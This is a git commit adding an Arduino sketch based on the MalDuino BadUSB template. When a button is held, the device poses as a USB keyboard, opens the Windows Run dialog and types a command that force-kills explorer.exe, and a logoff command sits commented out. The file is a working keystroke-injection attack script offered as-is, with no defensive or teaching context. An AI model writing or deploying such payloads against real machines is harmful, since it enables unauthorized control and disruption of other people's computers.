6211cfc1af93e8bd428997a3c7fbc0915f20901a
alex <38940961+kintdev@users.noreply.github.com>
2019-04-10 11:32:09 +0200

    Add files via upload

---
+++ testdoc.ino
@@ -0,0 +1,77 @@
+/*
+Copyright (c) 2017 Seytonic, Spacehuhn (Licensed under MIT)
+For more information see: github.com/seytonic/malduino
+*/
+
+#include "Keyboard.h"
+#include "Mouse.h"
+
+#define blinkInterval 100
+#define ledPin 3
+#define buttonPin 6
+
+int defaultDelay = 4;
+int defaultCharDelay = 5;
+int rMin = 0;
+int rMax = 100;
+
+bool ledOn = true;
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(defaultCharDelay);
+  Keyboard.release(key);
+}
+
+void setup(){
+  
+  pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  
+  if(digitalRead(buttonPin) == LOW){
+    
+    Keyboard.begin();
+    Mouse.begin();
+    
+    /* ----- Begin-Script -----*/
+
+    delay(1000);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('d');
+    Keyboard.releaseAll();
+    delay(100);
+    
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(300);
+    
+    Keyboard.print("taskkill /f /im explorer.exe");
+    delay(100);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(500);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('d');
+    Keyboard.releaseAll();
+    delay(100);
+    
+    //Keyboard.print("shutdown -L");
+    //delay(200);
+    //Keyboard.press(KEY_RETURN);
+    //Keyboard.releaseAll();
+
+
+      
+      /* ----- End-Script -----*/
+    
+    Keyboard.end();
+  }
+}
+
+void loop(){
+  ledOn = !ledOn;
+  digitalWrite(ledPin, ledOn);
+  delay(blinkInterval);
+}
